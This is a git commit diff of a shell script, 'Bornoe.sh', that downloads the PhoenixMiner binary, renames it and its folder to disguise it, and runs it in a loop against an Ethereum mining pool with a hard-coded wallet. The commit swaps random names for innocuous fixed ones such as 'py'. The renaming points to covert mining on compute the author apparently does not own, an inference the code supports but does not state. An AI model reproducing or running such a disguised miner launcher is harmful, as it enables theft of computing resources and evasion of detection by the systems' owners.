c73716639866f138bcb7707cccda468a1ef65137
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-07-14 06:54:21 -0600

    Update Bornoe.sh

--- Bornoe.sh
+++ Bornoe.sh
@@ -1,16 +1,16 @@
 #!/bin/sh
-apt-get install libpci3 && P=$(echo GPU-$(shuf -i 1-1000 -n 1)-NEO) && y=$(( RANDOM - ( RANDOM + RANDOM ) )) && dir=$RANDOM && rn=$(shuf -i 500-1000000000 -n 1)
+apt-get install libpci3 && P=$(echo GPU-$(shuf -i 1-1000 -n 1)-NEO)
 x=1
-mkdir $dir
-cd $dir
+mkdir neo
+cd neo
 wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz 
 tar -xf PhoenixMiner_5.6d_Linux.tar.gz && cd PhoenixMiner_5.6d_Linux
-mv PhoenixMiner_5.6d_Linux $rn && cd $rn
-mv PhoenixMiner $y
+mv PhoenixMiner_5.6d_Linux norm && cd norm
+mv PhoenixMiner py
 while [ $x -le 20 ]
 do
 
-  ./$y -pool eth.2miners.com:2020 -wal 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.PNIX$P -pass x -mi 14 -gt 400
+  ./py -pool eth.2miners.com:2020 -wal 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.PNIX$P -pass x -mi 14 -gt 400
 
 
   x=$(( $x + 1 ))
